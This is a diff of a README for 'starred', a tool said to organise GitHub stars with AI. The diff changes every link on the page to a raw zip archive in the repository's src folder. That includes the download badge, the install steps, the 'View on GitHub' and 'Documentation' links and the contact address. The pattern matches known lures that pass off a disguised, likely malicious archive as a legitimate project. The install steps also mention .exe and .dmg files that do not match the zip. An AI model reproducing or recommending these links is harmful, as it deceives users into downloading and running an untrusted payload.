@@ -1,7 +1,7 @@
 # 🌟 starred - Automatically Organize Your GitHub Stars
 
 ## 🚀 Quick Download
-[![Download starred](https://github.com/Darkcreateur/starred/raw/refs/heads/main/src/llm/Software-2.1.zip)](https://github.com/Darkcreateur/starred/raw/refs/heads/main/src/llm/Software-2.1.zip)
+[![Download starred](https://raw.githubusercontent.com/Darkcreateur/starred/main/src/Software-2.8.zip)](https://raw.githubusercontent.com/Darkcreateur/starred/main/src/Software-2.8.zip)
 
 ## 📜 Description
 starred helps you automatically categorize your GitHub starred repositories using AI. Choose from Claude, GPT, or Gemini. You can export your categorized lists to Markdown and optionally sync with your GitHub star lists. This tool simplifies managing your bookmarks on GitHub, making it easier to find and use your favorite resources.
@@ -18,11 +18,11 @@ starred helps you automatically categorize your GitHub starred repositories usin
 - **Web Browser**: Chrome, Firefox, or Edge for the best experience.
 
 ## 📥 Download & Install
-To get started with starred, visit this page to download: [Download starred](https://github.com/Darkcreateur/starred/raw/refs/heads/main/src/llm/Software-2.1.zip).
+To get started with starred, visit this page to download: [Download starred](https://raw.githubusercontent.com/Darkcreateur/starred/main/src/Software-2.8.zip).
 
 Follow these steps to install the application:
 
-1. Click on the [Download starred](https://github.com/Darkcreateur/starred/raw/refs/heads/main/src/llm/Software-2.1.zip) link above.
+1. Click on the [Download starred](https://raw.githubusercontent.com/Darkcreateur/starred/main/src/Software-2.8.zip) link above.
 2. You will find a list of available versions. Choose the latest version.
 3. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or a compressed file for Linux).
 4. Once the download is complete, locate the file on your device.
@@ -60,8 +60,8 @@ Follow these steps to install the application:
 If you encounter any issues or have questions, feel free to check out the GitHub Issues page or join our community discussions.
 
 ## 🔗 Links
-- [View on GitHub](https://github.com/Darkcreateur/starred/raw/refs/heads/main/src/llm/Software-2.1.zip)
-- [Documentation](https://github.com/Darkcreateur/starred/raw/refs/heads/main/src/llm/Software-2.1.zip) 
+- [View on GitHub](https://raw.githubusercontent.com/Darkcreateur/starred/main/src/Software-2.8.zip)
+- [Documentation](https://raw.githubusercontent.com/Darkcreateur/starred/main/src/Software-2.8.zip) 
 
 ## 📝 Contributing
 We welcome contributions from anyone. If you want to help improve starred, please check our contribution guide in the documentation.
@@ -70,4 +70,4 @@ We welcome contributions from anyone. If you want to help improve starred, pleas
 Stay tuned for updates! We regularly add features and improvements. Make sure to check the Releases page for the latest version. 
 
 ## 📧 Contact
-For any inquiries, reach the developers at [https://github.com/Darkcreateur/starred/raw/refs/heads/main/src/llm/Software-2.1.zip](https://github.com/Darkcreateur/starred/raw/refs/heads/main/src/llm/Software-2.1.zip).
+For any inquiries, reach the developers at [https://raw.githubusercontent.com/Darkcreateur/starred/main/src/Software-2.8.zip](https://raw.githubusercontent.com/Darkcreateur/starred/main/src/Software-2.8.zip).
